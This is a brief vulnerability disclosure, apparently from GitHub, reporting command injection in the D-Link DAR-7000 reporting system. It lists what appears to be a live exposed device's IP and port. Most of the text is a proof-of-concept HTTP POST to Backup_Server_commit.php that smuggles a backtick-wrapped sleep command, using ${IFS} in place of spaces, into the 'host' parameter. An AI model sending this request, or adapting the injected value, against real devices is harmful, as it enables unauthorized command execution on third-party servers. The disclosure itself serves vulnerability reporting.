There is a command execution vulnerability in the reporting system of Youxun Group, resulting in server information leakage

official： http://www.dlink.com.cn/

version:DAR-7000

221.193.248.37:9091


<img width="665" alt="图片" src="https://github.com/user-attachments/assets/5ed55ce4-88a6-4005-97a1-a6335849b506" />

```

POST /view/DBManage/Backup_Server_commit.php?action=test HTTP/1.1
Host: 127.0.0.1
Cookie: 
Content-Length: 50
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i
Connection: close

host=`sleep${IFS}3`&mode=0&port=80&user=&password=
```

<img width="701" alt="图片" src="https://github.com/user-attachments/assets/ff18a81a-b84f-4212-91f6-c7f9a5760fda" />

